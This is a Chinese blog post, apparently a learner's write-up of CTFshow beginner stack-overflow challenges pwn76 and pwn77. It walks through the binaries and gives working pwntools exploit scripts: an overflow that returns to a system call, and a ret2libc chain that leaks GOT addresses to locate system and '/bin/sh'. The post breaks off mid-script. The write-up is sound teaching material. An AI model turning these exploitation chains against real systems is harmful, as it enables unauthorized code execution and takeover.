---
title: CTFshow-Pwn入门栈溢出（76-79,81-85）
url: https://mp.weixin.qq.com/s/GaYsfPz0mJBEcl2-2F7Vuw
source: Doonsec's feed
date: 2026-03-16
fetch_date: 2026-03-17T04:14:01.195569
---

# CTFshow-Pwn入门栈溢出（76-79,81-85）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YdkQKXYKSBh02tSpb8Mg6jTyjJFDpfzrJfNcX0UmBUWfwIBjerpX7mAKOkspgMf5UIQdShLibupSx0AIEBeb7Zqh3KGRvQZXRv0GhoXibBuT8/0?wx_fmt=jpeg)

# CTFshow-Pwn入门栈溢出（76-79,81-85）

原创

玫幽倩
玫幽倩

玫家大院

![]()

在小说阅读器中沉浸阅读

有一阵子没做pwn了，pwn做的有点少，但其实做pwn还是很有意思的，虽然做的时候很难弄，但是解出来还是很爽的

来更新一下日记好了

## pwn76

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBia8CMCibfFicMuWYYMXydibpZUtO2ibnc6Jtibj5biaH0yHwwibKX136QmKia2ia28eibiamDHw0oNgWCNTia4UXgxmr8CMAkJ9hKazQaqIicIY/640?wx_fmt=png&from=appmsg)

保护：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhorJ3X3Oln9k3koYtianPHuDRBs5JJlO7ibodbCcLAvbxLWHBCy2AElxkOa9lWCXVGajcZtg1ajMRat1bCVicD1P9EN7PMpZibkAY/640?wx_fmt=png&from=appmsg)

上个月我们知道了，在ida里可以看到下述内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBjsET1uIY4UQAB1ENIStAJSGq357ticlwpjUSTxF7h2NhH9yrpHRQSxHLPt3s9PvGnlxY4whBBhzW1bY3m31mqicjXgGGBjcnzK0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBgib92d85SqWeMrK2QTcyW9Ohm2eBhu6jv2bvEbicFcZbwheoUDZBgazykTZYwrjdS6elqvmqNUslNQlBvnnw8tThiaW6KichlUB24/640?wx_fmt=png&from=appmsg)

可以看到程序里就有现成的后门函数

我们只要能进到这个correct函数里，然后做到让input等于0xDEADBEEF就行了

我们理一下程序在干啥

一开始读取0x30以内的输入，然后进Base64Decode函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaRMjRVXysWFamMKQ94T1f0Bl4MtGAMwMNKv3F22B2RQoiaYMXZSxTkG9n3Zqib0xeZF6ea7eVLKiamR78ddpSXpWgiaJkNGmrzp3w/640?wx_fmt=png&from=appmsg)

函数执行后，解码出的原始数据长度保存在返回值 `v7`中，而解码后的数据本身则存放在由指针 `v5`所指向的内存位置里

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaXW8IR6oWtjtAG8ZwEw9F1xlwZyiaXo5vibgIuwnzjSGweKarS95jVUTEaYKUfuCdjVa7SYElPQDialalF8icTfaUjnhqLDfka2F8/640?wx_fmt=png&from=appmsg)

在内部发生了这样子的事情，最后的v10会填充到v7之中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaVGu926I09lwb26Jb5J92xqOuQWg99rZoJyyeGIXibUVN6AvGfZ3ByvInGbUoS3XEmmtoUFzE7NnXx2btnvgjEhprgNIoExwBk/640?wx_fmt=png&from=appmsg)

接着去进行长度校验与数据复制：程序检查解码后的数据长度是否大于0xC（即十进制的12）。如果超过12字节，就会输出 "Input Error!"。

只有长度不超过12字节时，程序才会将解码后的数据复制到一个全局变量input中。

最后进行验证

程序调用auth函数对复制到input中的数据进行验证。如果 auth函数返回1，则调用我们的后门函数

也就是让strcmp("f87cd601aa7fedca99018a8be88eda34", s2)

等于0，即使得s2和f87cd601aa7fedca99018a8be88eda34完全相同

而s2是v2的md5值

然而这个似乎无法逆向推出，因此这题是不能利用这个思路做的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBjGaPkoSb1K4ognTAxcQZCJ2PwnubicwTaLAkshw7OFZmHcibHUm9EdTaKKb5muNiatqsJbUKOkOmWARpUPJOL0thpNqSOawsUmn4/640?wx_fmt=png&from=appmsg)

在auth函数这边我们可以看到有个memcpy

这边的v4发现了栈溢出漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhofKOq2VkF9RId7zwbjnEVxTWSfdnlibMibOrdPttM6yypDg1NPlgicWBNnJ2XLt8LusUsG81ksDMCQZFHf8s1kbwMSibdMDb4a10/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBjD31K4nt4zQibds73yR85LkhNRB0PqIMTUbsr1cGsgCHC4Yw0IsPkXDk5My0wib6YpCIPibibtooR8vDqGWrmeOFaXz3rKjld4VTU/640?wx_fmt=png&from=appmsg)

我们输入4个字节就会导致栈溢出

这个之后我们可以直接跳到敏感函数的地方，当然也可以去迎合敏感函数对比条件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBg8yibX0UwvtmyBVibF2E2ycxzAw2hqfL3o8IqoWllFFpWNmrGuJm6bYic9DOU7BzicTEibicCAJdpicqeGk2GNoCrS8qqyxEerDfDmX4/640?wx_fmt=png&from=appmsg)

方法一我们选择直接跳到system函数，因此这边不应该是correct函数的位置，而是这一行system的位置

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhNH3EHH0fNNUCzS1RXvR33zh7QHDDMG9niapuKXicfzbIGs2q7WuscY2lyiaXHgoeyDNOeGQ9ibb3mjlibQNhWU4n3uQCjwfBRFenU/640?wx_fmt=png&from=appmsg)

system=0x08049284

我们先把溢出构造传到input里，然后再返回这个后门函数就好了

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBgiaxTUXEmaahXIcyN02sQlCExCgopvib5RMlRw7VaHcWbXTECEeSicw2lYKD0qicddBVE5BCxxFEUL9peOroAeI0ZDppUKWhfNOcI/640?wx_fmt=png&from=appmsg)

input=0x0811EB40

所以写得exp，当然考虑到这边代码后边会进行一次base64解码，我们需要在传入的时候先base64加密一下

```
from pwn import *
import base64

context(arch="i386",log_level="debug")
io=remote("pwn.challenge.ctf.show",28302)

io.recvuntil(b"CTFshow login:")
system=0x08049284
inp=0x0811EB40
payload=b'aaaa' + p32(system) + p32(inp)
payload=base64.b64encode(payload)

io.sendline(payload)
io.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBj9rphjJL53qCy7IB976Ot97YemDgOiaUoJBiccTdPgDuO2KTSYzFIH1icUUsdxWeuOoGk2utetjeLjZ85Kx17Bu3C0ibKVWBwiaebo/640?wx_fmt=png&from=appmsg)

当然方法二我们也可以选择直接把input该有的内容输入后返回到correct函数，同样可以得到flag

因为这个输入超过了4字节，同样有溢出，否则好像不太行

```
from pwn import *
import base64

context(arch="i386",log_level="debug")
io=remote("pwn.challenge.ctf.show",28302)
io.recvuntil(b"CTFshow login:")

inp=0x0811EB40
correct=0x0804925F

payload=p32(0xDEADBEEF) + p32(correct) + p32(inp)
payload=base64.b64encode(payload)

io.sendline(payload)
io.interactive()
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaIWXWqav3l4sk4iczJ7Lj7z5bYbV0m4KBzEHU6PrqA8ctoJyx6Vs4QibjDia2uo79ccrGTPRmI4g9zkicg8YVhcJyBdU9pNsrDyRE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaotgdJN8Uz6b5R2HXvZDl1gm0AW9xHjIjGxfId3LqEpd7qIBVIhfn5ZGuhp7fRhWePnULGSNRjepwV6ThNhIrnCmNEWYTwy7o/640?wx_fmt=png&from=appmsg)

## pwn77

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBh2T8qVrwGAXu0Zb6ogyic97dfSdTpXcH1XGHFHmTDmiaichhdtJDzWnujqxDavRgwj0UbvweUzFXAa7icMBAeAEXPpSPRvxW0RJ8E/640?wx_fmt=png&from=appmsg)

保护：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBgX5kyaunV5BX45FmkIphWEzZvwOAqOfJNdicD1YKEiawHzzBtpBEWGhKVShVGicswicrDl5EQuibOe5x4aTamMFBXr7xNaicue7JPHk/640?wx_fmt=png&from=appmsg)

只开了NX，问题不大，64位的

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhYWeSyvvO4XPPAkUKBTRN8Km7icXN5bPsLpj79WmLAACiclkt2rV6sHOQQA2jict8zTydl8McIp0VTMKS8hujEmAVFSibTHuuUw5Y/640?wx_fmt=png&from=appmsg)

main函数首先是这样子，main函数几乎没什么，用了puts函数输出了没啥意义的东西，然后alarm限制了一下运行时间在48秒内

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhAzyAIiaSTVQcichxUbdfngP1jt7XHbv1aa28nYW1U1AQ5JsHjeO9OEHZ5Mfx0Nyn3bRlRDouKPjwPqiaWWCsXKsEGKSaHyIrYm0/640?wx_fmt=png&from=appmsg)

来看ctfshow函数，这边是有个检测器，检测到ASCII为10的就break，逐个检查

也就是检查到换行符就结束

这边字符串v2的大小设置为了267，但是理论上while函数可以一直读下去

所以v2这存在栈溢出

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBgJ5giaEAuib9U0LR3Gph7lsLPE0MEJa3KZJeYeomxXXm9xPBMaxoibIxvwLHV7PPqMAicZjLEAkw8syBnRUugPM5X0O2dBicZ6d450/640?wx_fmt=png&from=appmsg)

padding=0x110+8

但这只是理论距离，真正利用的时候不是直接填满0x118字节

因为栈上还有char c在rbp-0x5，还以int i在rbp-0x4

正确的利用点是b'A'\*0x10c+b'\x18'

这一题发现不存在system函数和shell，因此本题必须利用libc，我们得算基址了

这边存在fgetc函数，我们利用fgetc的真实地址减去偏移地址得到基地址，其实就是利用这个函数在got的真实地址，减去了其偏移地址，最后得到基地址

这边前边有一个T^T，用的是puts函数，我们可以利用这个来泄露出fgets的got真实地址

```
elf = ELF("./pwn77")
puts_plt = elf.plt['puts']
fgetc_got = elf.got['fgetc']
main=elf.sym['main']
```

所以我们第一个payload用于利用puts函数泄露fgetc函数的真实地址

查一下rdi之类的然后发第一次了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBj57Zs4CD9fiaXXcfPJBDwmyrLzibib2y866BGOnIwanRkOeC5d8vt5Yo0T56vwxmr1chwC41q21jficHOaowaeh7O5BXsmDpquVHM/640?wx_fmt=png&from=appmsg)

```
prefix = b'A' * 0x10c + b'\x18'
payload = prefix
payload += p64(pop_rdi)
payload += p64(fgetc_got)
payload += p64(ret)
payload += p64(puts_plt)
payload += p64(main)
io.sendlineafter("T^T\n", payload)
fgetc = u64(io.recv(6).ljust(8, "\x00"))
```

就是先溢出，然后把fgetc的got地址作为puts函数的参数给输出出去，最后返回到main函数

但是搞半天发现LibcSearcher有一大堆库，我们可以双泄露来定位Libc

```
fgetc_addr = leak(fgetc_got)
puts_addr = leak(puts_got)

libc = LibcSearcher("fgetc", fgetc_addr)
libc.add_condition("puts", puts_addr)
```

```
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')

io = remote("pwn.challenge.ctf.show", 28290)

puts_plt  = 0x400590
puts_got  = 0x602018
fgetc_got = 0x602020
main      = 0x400833
pop_rdi   = 0x4008e3
ret       = 0x400576

prefix = b'A' * 0x10c + b'\x18'

def leak(addr):
    payload = prefix
    payload += p64(pop_rdi)
    payload += p64(addr)
    payload += p64(ret)
    payload += p64(puts_plt)
    payload += p64(main)

    io.sendline(payload)
    data = io.recvuntil(b"T^T\n", drop=False)
    leak_line = data.split(b'\n')[0]
    return u64(leak_line.ljust(8, b'\x00'))

io.recvuntil(b"T^T\n")

fgetc_addr = leak(fgetc_got)
log.success("fgetc_addr = " + hex(fgetc_addr))

puts_addr = leak(puts_got)
log.success("puts_addr = " + hex(puts_addr))

libc = LibcSearcher("fgetc", fgetc_addr)
libc.add_condition("puts", puts_addr)

libc_base   = fgetc_addr - libc.dump("fgetc")
system_addr = libc_base + libc.dump("system")
binsh_addr  = libc_base + libc.dump("str_bin_sh")

log.success("libc_base = "...